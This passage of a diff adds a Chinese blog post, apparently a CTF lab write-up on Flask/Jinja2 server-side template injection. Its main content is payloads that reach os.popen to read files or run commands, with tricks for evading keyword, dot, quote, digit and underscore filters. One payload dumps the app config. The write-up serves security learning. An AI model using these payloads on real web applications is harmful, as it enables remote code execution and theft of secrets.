+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.slice"><code>slice()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.upper"><code>upper()</code></a></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.default"><code>default()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.int"><code>int()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.random"><code>random()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.sort"><code>sort()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.urlencode"><code>urlencode()</code></a></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.dictsort"><code>dictsort()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.join"><code>join()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.reject"><code>reject()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.string"><code>string()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.urlize"><code>urlize()</code></a></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.escape"><code>escape()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.last"><code>last()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.rejectattr"><code>rejectattr()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.striptags"><code>striptags()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.wordcount"><code>wordcount()</code></a></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.filesizeformat"><code>filesizeformat()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.length"><code>length()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.replace"><code>replace()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.sum"><code>sum()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.wordwrap"><code>wordwrap()</code></a></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.first"><code>first()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.list"><code>list()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.reverse"><code>reverse()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.title"><code>title()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.xmlattr"><code>xmlattr()</code></a></td>
+</tr>
+</tbody></table>
+<p><em><strong>常用过滤器</strong></em></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">length() <span class="comment"># 获取一个序列或者字典的长度并将其返回</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span>()：<span class="comment"># 将值转换为int类型；</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">float</span>()：<span class="comment"># 将值转换为float类型；</span></span><br><span class="line"></span><br><span class="line">lower()：<span class="comment"># 将字符串转换为小写；</span></span><br><span class="line"></span><br><span class="line">upper()：<span class="comment"># 将字符串转换为大写；</span></span><br><span class="line"></span><br><span class="line">reverse()：<span class="comment"># 反转字符串；</span></span><br><span class="line"></span><br><span class="line">replace(value,old,new)： <span class="comment"># 将value中的old替换为new</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>()：<span class="comment"># 将变量转换为列表类型；</span></span><br><span class="line"></span><br><span class="line">string()：<span class="comment"># 将变量转换成字符串类型；</span></span><br><span class="line"></span><br><span class="line">join()：<span class="comment"># 将一个序列中的参数值拼接成字符串,通常有python内置的dict()配合使用</span></span><br><span class="line"></span><br><span class="line">attr(): <span class="comment"># 获取对象的属性</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>回到原题,本题我们利用到的过滤器为<code>attr()</code>.其用法为 <code>foo|attr(&quot;bar&quot;)</code>,结果等价于<code>foo.bar</code></p>
+<p>我们可以利用<code>request.args</code>向attr里面传入参数,</p>
+<p>但这里再介绍一种编码绕过,</p>
+<p><code>__class__ =&gt; \x5f\x5fclass\x5f\x5f</code></p>
+<p>其中<code>_ </code>的十六进制编码为<code>\x5f</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926104739695.png" alt="image-20210926104739695"></p>
+<p>构造payload,拿到flag</p>
+<blockquote>
+<p>paload原型: ().__class__.__base__.__subclasses__()[132].__init__.__globals__[‘open’](‘cat flag’).read()</p>
+</blockquote>
+<p><code>{{()|attr(&quot;\x5f\x5fclass\x5f\x5f&quot;)|attr(&quot;\x5f\x5fbase\x5f\x5f&quot;)|attr(&quot;\x5f\x5fsubclasses\x5f\x5f&quot;)()|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(132)|attr(&quot;\x5f\x5finit\x5f\x5f&quot;)|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&#39;popen&#39;)(&#39;cat flag&#39;)|attr(&quot;read&quot;)()}}</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926111523826.png" alt="image-20210926111523826"></p>
+<h4 id="拓展-3"><a href="#拓展-3" class="headerlink" title="拓展"></a>拓展</h4><p>除了可以使用十六进制编码外,还可以使用unioncode</p>
+<p><code>__class__</code>&#x3D;&gt;<code>\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f</code></p>
+<p><a target="_blank" rel="noopener" href="https://buaq.net/go-74232.html">例子</a>:</p>
+<p><code>{{()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(77)|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;ls&quot;)|attr(&quot;read&quot;)()}}</code></p>
+<p><em><strong>Unicode编码后:</strong></em></p>
+<p><code>{{()|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;)()|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(77)|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;ls&quot;)|attr(&quot;read&quot;)()}}</code></p>
+<h3 id="Level-7-bypass"><a href="#Level-7-bypass" class="headerlink" title="Level 7 bypass ."></a>Level 7 bypass .</h3><p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926111709414.png" alt="image-20210926111709414"><br>初步尝试发现过滤了<code>.</code>,其余没有任何过滤,此处可以使用<code>[]</code>绕过.</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#variables">You can use a dot (<code>.</code>) to access attributes of a variable in addition to the standard Python <code>__getitem__</code> “subscript” syntax (<code>[]</code>).</a></p>
+<p>python语法除了可以使用点 <code>.</code>来访问对象属性外,还可以使用中括号<code>[]</code>.同样也可以使用__getitem__</p>
+</blockquote>
+<p>构造payload,拿到flag</p>
+<p><code>{{()[&#39;__class__&#39;][&#39;__base__&#39;][&#39;__subclasses__&#39;]()[132][&#39;__init__&#39;][&#39;__globals__&#39;][&#39;popen&#39;](&#39;cat flag&#39;)[&#39;read&#39;]()}}</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926112300549.png" alt="	"></p>
+<h3 id="Level-8-bypass-keywords"><a href="#Level-8-bypass-keywords" class="headerlink" title="Level 8 bypass keywords"></a>Level 8 bypass keywords</h3><p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926130328927.png" alt="image-20210926130328927"></p>
+<p>从提示可以看到ban了许多关键字.此处可以使用<code>字符串拼接</code>绕过</p>
+<p>构造payload,拿到flag</p>
+<p><code>{{()[&#39;__cla&#39;&#39;ss__&#39;][&#39;__ba&#39;&#39;se__&#39;][&#39;__subcla&#39;&#39;sses__&#39;]()[132][&#39;__in&#39;&#39;it__&#39;][&#39;__glo&#39;&#39;bals__&#39;][&#39;popen&#39;](&#39;cat flag&#39;)[&#39;read&#39;]()}}</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926143626497.png" alt="image-20210926143626497"></p>
+<h4 id="拓展-4"><a href="#拓展-4" class="headerlink" title="拓展"></a>拓展</h4><p>除了使用简单的字符串拼接方式外,还可以使用:</p>
+<ol>
+<li><p>字符编码(上面介绍过,就不再提了)</p>
+</li>
+<li><p>使用<code>Jinjia2</code>中的<code>~</code>进行拼接.如<code>{%set a=&quot;__cla&quot;%}{%set aa=&quot;ss__&quot;%}{{a~aa}}</code></p>
+</li>
+<li><p>使用<code>join</code>过滤器.例如使用<code>{%set a=dict(__cla=a,ss__=a)|join%}{{a}}</code>,会将<code>__cla</code>和<code>ss__</code>拼接在一起,或者<code>{%set a=[&#39;__cla&#39;,&#39;ss__&#39;]|join%}{{a}}</code></p>
+</li>
+<li><p>使用<code>reverse</code>过滤器.如<code>{%set a=&quot;__ssalc__&quot;|reverse%}{{a}}</code></p>
+</li>
+<li><p>使用<code>replace</code>过滤器.如<code>{%set a=&quot;__claee__&quot;|replace(&quot;ee&quot;,&quot;ss&quot;)%}{{a}}</code></p>
+</li>
+<li><p>利用python的<code>char()</code>.例如</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">chr</span> %&#125;</span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="built_in">chr</span>(<span class="number">95</span>)%2bchr(<span class="number">95</span>)%2bchr(<span class="number">99</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">115</span>)%2bchr(<span class="number">115</span>)%2bchr(<span class="number">95</span>)%2bchr(<span class="number">95</span>)]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>…</p>
+</li>
+</ol>
+<h3 id="Level-9-bypass-number"><a href="#Level-9-bypass-number" class="headerlink" title="Level 9 bypass number"></a>Level 9 bypass number</h3><p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926143646554.png" alt="image-20210926143646554"></p>
+<p>从提示可以看出ban了所有数字,所以这道题得想办法构造数字.使用过滤器<code>|length</code>可以绕过</p>
+<p>使用过滤器构造132</p>
+<p><code>{% set a=&#39;aaaaaaaaaaa&#39;|length*&#39;aaa&#39;|length*&#39;aaaa&#39;|length %}{{a}}</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926150339261.png" alt="image-20210926150339261"></p>
+<p><code>{{()[&#39;__class__&#39;][&#39;__base__&#39;][&#39;__subclasses__&#39;]()[132][&#39;__init__&#39;][&#39;__globals__&#39;][&#39;popen&#39;](&#39;cat flag&#39;)[&#39;read&#39;]()}}</code></p>
+<p>构造payload,拿到flag</p>
+<p><code>{% set a=&#39;aaaaaaaaaaa&#39;|length*&#39;aaa&#39;|length*&#39;aaaa&#39;|length %}{{()[&#39;__class__&#39;][&#39;__base__&#39;][&#39;__subclasses__&#39;]()[a][&#39;__init__&#39;][&#39;__globals__&#39;][&#39;popen&#39;](&#39;cat flag&#39;)[&#39;read&#39;]()}}</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926150534193.png" alt="image-20210926150534193"></p>
+<h3 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h3><p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926143655782.png" alt="image-20210926143655782"></p>
+<p>这一关的目的是拿到config,当我们使用<code>{{config}}</code>以及<code>{{self}}</code>时都返回了None.看来是被ban了,所以得重新寻找一个储存相关信息的变量.</p>
+<p><a target="_blank" rel="noopener" href="https://ctftime.org/writeup/11036">通过寻找</a>,发现存在这么一个变量<code>current_app</code>是我们需要的.<a target="_blank" rel="noopener" href="http://docs.jinkan.org/docs/flask/appcontext.html">官网</a>对<code>current_app</code>提供了这么一句说明</p>
+<blockquote>
+<p>应用上下文会在必要时被创建和销毁。它不会在线程间移动，并且也不会在不同的请求之间共享。正因为如此，它是一个存储数据库连接信息或是别的东西的最佳位置。</p>
+</blockquote>
+<p>因此,此处能使用<code>current_app</code>绕过.</p>
+<p>构造payload,拿到config<br><code>{{url_for.__globals__[&#39;current_app&#39;].config}}</code><br><code>{{get_flashed_messages.__globals__[&#39;current_app&#39;].config}}</code></p>
+<h3 id="Level-11-bypass-combination1"><a href="#Level-11-bypass-combination1" class="headerlink" title="Level 11 bypass combination1"></a>Level 11 bypass combination1</h3><p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926143712383.png" alt="image-20210926143712383"><br>这一关颜色和之前不同,感觉难度会有所增加.</p>
+<p>绕过<code>&#39; &quot;</code>可以用request构造get参数代替,但是request 被ban了,request 可以使用字符串拼接构造,但是<code>&#39; &quot;</code>又被ban了,<code>.</code>被过滤可以用<code>[]</code>绕过,但是<code>[]</code>也被ban了.<code>[]</code>可以用<code>__getitem__</code>绕过,<code>.</code>可以用<code>attr</code>绕过,这两个没有被过滤,说明还是有希望.现在关键就是怎么绕过<code>&#39; 和 &quot;</code>.</p>
+<p>再<code>Level 9 bypass keyword</code> 的扩展中,使用过滤器<code>dict()|join</code>构造关键子的过程中没有出现<code>&#39; &quot;</code>,可以使用这种办法绕过.</p>
+<p><code>{%set a=dict(__cla=a,ss__=b)|join%}{{()|attr(a)}}</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926170311552.png" alt="image-20210926170311552"></p>
+<p>不过在后面构造命令<code>cat flag</code>时空格无法识别.通过这篇<a target="_blank" rel="noopener" href="https://buaq.net/go-74232.html">博客</a>,发现了新思路.</p>
+<h4 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h4><p>通过以下构造可以得到字符串,举个例,可以发现输出的字符串中存在空格、部分数字、<code>&lt;</code>以及部分字母.利用过滤器<code>list</code>将其变为列表类型再配合使用索引,就能得到我们想要的.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> org = (self|string()) %&#125;&#123;&#123;org&#125;&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> org = self|string|urlencode %&#125;&#123;&#123;org&#125;&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> org = (app.__doc__|string) %&#125;&#123;&#123;org&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927143907669.png" alt="image-20210927143907669"></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927144342078.png" alt="image-20210927144342078"></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927144420692.png" alt="image-20210927144420692"></p>
+<p>同理,使用urlencode中还出现了百分号.在<code>%</code>被过滤时可以尝试使用这种方法进行绕过.</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927144625707.png" alt="image-20210927144625707"></p>
+<p>构造payload,拿到flag</p>
+<blockquote>
+<p>payload原型:().__class__.__base__.__subclasses__()[132].__init__.__globals__[‘popen’](‘cat flag’).read()</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> a=<span class="built_in">dict</span>(__cla=a,ss__=b)|join %&#125;  <span class="comment"># __class__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> b=<span class="built_in">dict</span>(__bas=a,e__=b)|join %&#125;	  <span class="comment"># __basess__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> c=<span class="built_in">dict</span>(__subcla=a,sses__=b)|join %&#125;    <span class="comment"># __subclasses__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> d=<span class="built_in">dict</span>(__ge=a,titem__=a)|join%&#125;    <span class="comment"># __getitem__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> e=<span class="built_in">dict</span>(__<span class="keyword">in</span>=a,it__=b)|join %&#125;		 <span class="comment"># __init__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> f=<span class="built_in">dict</span>(__glo=a,bals__=b)|join %&#125;	<span class="comment"># __globals__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> g=<span class="built_in">dict</span>(pop=a,en=b)|join %&#125;	<span class="comment"># popen</span></span><br><span class="line">&#123;%<span class="built_in">set</span> h=self|string|attr(d)(<span class="number">18</span>)%&#125;	<span class="comment"># 空格</span></span><br><span class="line">&#123;%<span class="built_in">set</span> i=(<span class="built_in">dict</span>(cat=abc)|join,h,<span class="built_in">dict</span>(flag=b)|join)|join%&#125;  <span class="comment"># cat flag</span></span><br><span class="line">&#123;%<span class="built_in">set</span> j=<span class="built_in">dict</span>(read=a)|join%&#125; <span class="comment"># read</span></span><br><span class="line">&#123;&#123;()|attr(a)|attr(b)|attr(c)()|attr(d)(<span class="number">132</span>)|attr(e)|attr(f)|attr(d)(g)(i)|attr(j)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927125630695.png" alt="image-20210927125630695"></p>
+<h3 id="Level-12-bypass-combination2"><a href="#Level-12-bypass-combination2" class="headerlink" title="Level 12 bypass combination2"></a>Level 12 bypass combination2</h3><p>这一关和上一关的区别在于 没有过滤<code>request</code>,但是过滤了数字.所以可以使用<code>request.args</code>绕过.</p>
+<p>不过<code>request|attr(&quot;args&quot;)|attr(&quot;a&quot;)</code>并不能获取到通过get传递过来的<code>a参数</code>,所以这里得跟换为<code>request.args.get()</code>来获取get参数</p>
+<p>如果还是从<code>().__class__</code>构造,那代码段就太冗长了.通过搜索,在羽师父的博客中学到了一条简洁的构造链.</p>
+<p><code>{{x.__init__.__globals__[&#39;__builtins__&#39;]}}</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927145707004.png" alt="image-20210927145707004"></p>
+<p>构造payload,拿到flag</p>
+<blockquote>
+<p>payload原型: x.__init__.__globals__[‘__builtins__‘]<a href="%22__import__('os').popen('whoami').read()%22">‘eval’</a></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> a=&#123;&#125;|select|string|<span class="built_in">list</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> b=<span class="built_in">dict</span>(pop=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> c=a|attr(b)(self|string|length)%&#125;  <span class="comment"># _</span></span><br><span class="line">&#123;%<span class="built_in">set</span> d=(c,c,<span class="built_in">dict</span>(getitem=a)|join,c,c)|join%&#125;  <span class="comment"># __getitem__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> e=<span class="built_in">dict</span>(args=a)|join%&#125;		<span class="comment"># args</span></span><br><span class="line">&#123;%<span class="built_in">set</span> f=<span class="built_in">dict</span>(get=a)|join%&#125;		<span class="comment"># get</span></span><br><span class="line">&#123;%<span class="built_in">set</span> g=<span class="built_in">dict</span>(z=a)|join%&#125;		</span><br><span class="line">&#123;%<span class="built_in">set</span> gg=<span class="built_in">dict</span>(zz=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> ggg=<span class="built_in">dict</span>(zzz=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> gggg=<span class="built_in">dict</span>(zzzz=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> ggggg=<span class="built_in">dict</span>(zzzzz=a)|join%&#125;</span><br><span class="line">&#123;&#123;x|attr(request|attr(e)|attr(f)(g))|attr(request|attr(e)|attr(f)(gg))|attr(d)(request|attr(e)|attr(f)(ggg))|attr(d)(request|attr(e)|attr(f)(gggg))(request|attr(e)|attr(f)(ggggg))&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927125427004.png" alt="image-20210927125427004"></p>
+<h3 id="Level-13-bypass-combination3"><a href="#Level-13-bypass-combination3" class="headerlink" title="Level 13 bypass combination3"></a>Level 13 bypass combination3</h3><p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926143742060.png" alt="image-20210926143742060"></p>
+<p>这道题把<code>request</code>给ban了,过滤了更多关键字,不过还是可以用<code>Level 12</code>的思路</p>
+<p>构造payload,拿到flag</p>
+<blockquote>
+<p>payload原型:x.__init__.__globals__[‘__builtins__‘][‘__import__‘](‘os’).popen(‘cat flag’).read()”)</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> a=&#123;&#125;|select|string|<span class="built_in">list</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> ax=&#123;&#125;|select|string|<span class="built_in">list</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> aa=<span class="built_in">dict</span>(ssss=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> aaa=<span class="built_in">dict</span>(ssssss=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> aaaa=<span class="built_in">dict</span>(ss=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> aaaaa=<span class="built_in">dict</span>(sssss=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> b=<span class="built_in">dict</span>(pop=a)|join%&#125;   <span class="comment"># pop</span></span><br><span class="line">&#123;%<span class="built_in">set</span> c=a|attr(b)(aa|length*aaa|length)%&#125;  <span class="comment"># _</span></span><br><span class="line">&#123;%<span class="built_in">set</span> cc=a|attr(b)(aaaa|length*aaaaa|length)%&#125; <span class="comment"># 空格</span></span><br><span class="line">&#123;%<span class="built_in">set</span> d=(c,c,<span class="built_in">dict</span>(get=a,item=a)|join,c,c)|join%&#125;  <span class="comment"># __getitem__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> dd=(c,c,<span class="built_in">dict</span>(<span class="keyword">in</span>=a,it=a)|join,c,c)|join%&#125;   <span class="comment"># __init__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> ddd=(c,c,<span class="built_in">dict</span>(glob=a,als=a)|join,c,c)|join%&#125;   <span class="comment"># __globals__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> dddd=(c,c,<span class="built_in">dict</span>(buil=a,tins=a)|join,c,c)|join%&#125;   <span class="comment"># __builtins__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> e=(c,c,<span class="built_in">dict</span>(impo=a,rt=a)|join,c,c)|join%&#125;   <span class="comment"># __import__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> ee=(<span class="built_in">dict</span>(o=a,s=a)|join)|join%&#125;   <span class="comment"># os</span></span><br><span class="line">&#123;%<span class="built_in">set</span> eee=(<span class="built_in">dict</span>(po=a,pen=a)|join)|join%&#125;  <span class="comment"># popen</span></span><br><span class="line">&#123;%<span class="built_in">set</span> eeee=(<span class="built_in">dict</span>(cat=a)|join,cc,<span class="built_in">dict</span>(flag=a)|join)|join%&#125;  <span class="comment"># cat flag</span></span><br><span class="line">&#123;%<span class="built_in">set</span> f=(<span class="built_in">dict</span>(rea=a,d=a)|join)|join%&#125;  <span class="comment"># read</span></span><br><span class="line">&#123;&#123;x|attr(dd)|attr(ddd)|attr(d)(dddd)|attr(d)(e)(ee)|attr(eee)(eeee)|attr(f)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927111652753.png" alt="image-20210927111652753"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本篇文章主要介绍了<code>Flask</code>的服务端模板注入.其漏洞成因大多数是因为程序员的偷懒或者安全意识较低.</p>
+<p><code>SSTI</code>既然属于代码注入,那漏洞利用必然是想法设法去实现执行代码.在<code>Flask</code>中,我们可以通过类与类之间的继承关系拿到能够执行代码的函数,从而进行<code>RCE</code>.</p>
+<p><code>ssti</code>的基础payload构造形如:</p>
+<p><code>().__class__.__base__.__subclasses__()[64].__init__.__globals__[&#39;__import__&#39;](&#39;os&#39;).system(&#39;whoami&#39;)</code></p>
+<p>但在某些特定情况下可能存在不同字符的过滤,我们需要通过 <code>python</code>的一些内在特性或内建方法,尝试对被过滤字符进行构造.上面练习已经简单实现了部分字符bypass,但还不完全.读者可以尝试自行探索出更有趣的payload.</p>
+<p>关于<code>Flask SSTI</code>的防御,推荐使用更安全的<code>rander_template()</code>代替<code>rander_template_string()</code>.</p>
+<p>学无止境,希望这边能对各位师傅们有所帮助.</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/250481.html">https://www.freebuf.com/articles/web/250481.html</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/226900">https://www.anquanke.com/post/id/226900</a><br><a target="_blank" rel="noopener" href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI">https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI</a><br><a target="_blank" rel="noopener" href="https://buaq.net/go-74232.html">https://buaq.net/go-74232.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425">https://blog.csdn.net/miuzzx/article/details/110220425</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
